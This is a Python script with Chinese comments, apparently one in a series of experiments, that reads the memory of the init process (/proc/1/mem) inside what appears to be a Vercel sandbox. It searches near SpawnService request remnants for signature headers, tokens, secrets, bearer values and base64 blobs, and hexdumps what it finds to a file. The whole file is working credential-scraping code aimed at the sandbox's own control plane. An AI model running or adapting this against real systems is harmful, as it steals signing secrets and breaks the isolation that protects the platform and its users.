# 实验J12: 初始化请求残留深度捕获 - 命中点±512KB 搜 signature + 全量 hexdump
# J10: zap 日志缓冲含 procedure+timestamp+command 但无 signature 值
# 目标: 命中点附近大范围扫描 signature 头名/值; 结果写文件不依赖流
import os, re, time, threading

def read_mem_segment(start, size):
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, size, start)
        os.close(fd)
        return d
    except Exception:
        return b""

def get_maps():
    out = []
    try:
        for line in open("/proc/1/maps"):
            parts = line.split()
            if len(parts) < 2 or parts[1][0] != "r":
                continue
            a0, a1 = parts[0].split("-")
            out.append((int(a0, 16), int(a1, 16)))
    except Exception:
        pass
    return out

def hexdump(d, base):
    out = []
    for off in range(0, len(d), 16):
        chunk = d[off:off+16]
        hexs = " ".join(f"{b:02x}" for b in chunk)
        asci = "".join(chr(b) if 0x20 <= b < 0x7f else "." for b in chunk)
        out.append(f"  {base+off:016x}  {hexs:<48}  {asci}")
    return "\n".join(out)

OUT = open("/tmp/j12.txt", "w", buffering=1)

def log(s):
    OUT.write(s + "\n")
    print(s, flush=True)

stop = threading.Event()
hits = set()

def worker():
    """定位 POST/Ping/Spawn 残留, 然后大范围搜 signature"""
    maps = get_maps()
    log(f"[worker] {len(maps)} 段")
    anchors = []
    while not stop.is_set():
        for start, end in maps:
            size = min(end - start, 16 * 1024 * 1024)
            d = read_mem_segment(start, size)
            if not d:
                continue
            # 找锚点
            for pat in (b"POST /vercel.sandbox", b"SpawnService/Spawn", b"SpawnService/Ping"):
                i = d.find(pat)
                if i >= 0:
                    abs_off = start + i
                    if abs_off > 0x300000000000:
                        anchors.append(abs_off)
                        log(f"[anchor] {pat.decode()} @0x{abs_off:x}")
            # signature 直接命中
            for pat in (b"signature", b"Signature", b"x-vercel", b"X-Vercel", b"vercel-signature"):
                i = d.find(pat)
                if i >= 0:
                    abs_off = start + i
                    if abs_off > 0x300000000000 and abs_off not in hits:
                        hits.add(abs_off)
                        ctx = d[max(0, i-400):i+700]
                        log(f"[SIG-HIT] @0x{abs_off:x}")
                        log(hexdump(ctx, abs_off - 400))
        if anchors:
            break
        time.sleep(0.05)

    # 锚点大范围扫描: ±1MB 连续读, 找所有 ASCII 字符串+长 base64
    log(f"[deep] anchors={[hex(a) for a in anchors]}")
    for a in anchors:
        # 找到 anchor 所在段
        seg = None
        for start, end in maps:
            if start <= a < end:
                seg = (start, end)
                break
        if not seg:
            continue
        s0, s1 = seg
        r0, r1 = max(s0, a - 1024 * 1024), min(s1, a + 1024 * 1024)
        d = read_mem_segment(r0, r1 - r0)
        if not d:
            continue
        log(f"[deep] segment 0x{r0:x}-0x{r1:x} ({len(d)}B)")
        # 1. 所有 ASCII 字符串(>=4)
        seen = set()
        for m in re.finditer(rb"[\x20-\x7e]{4,200}", d):
            s = m.group(0)
            ls = s.lower()
            if (b"sig" in ls or b"auth" in ls or b"token" in ls or b"secret" in ls or
                b"key" in ls or b"vercel" in ls or b"timestamp" in ls or b"expire" in ls or
                b"nonce" in ls or b"1787" in s or b"http" in ls or b"bearer" in ls or
                (b"=" in s and len(s) > 40)) and s not in seen:
                seen.add(s)
                log(f"  str @0x{r0+m.start():x}: {s[:150].decode(errors='replace')}")
        # 2. base64 特征(>40B, 含 /+=)
        for m in re.finditer(rb"[A-Za-z0-9+/]{40,}={0,2}", d):
            s = m.group(0)
            if len(s) >= 44 and s not in seen:
                seen.add(s)
                log(f"  b64? @0x{r0+m.start():x}: {s[:120].decode()}")
    log("[deep] done")

t = threading.Thread(target=worker, daemon=True)
t.start()
deadline = time.time() + 100
while time.time() < deadline:
    time.sleep(1)
stop.set()
time.sleep(0.5)
log(f"done hits={len(hits)}")
OUT.close()
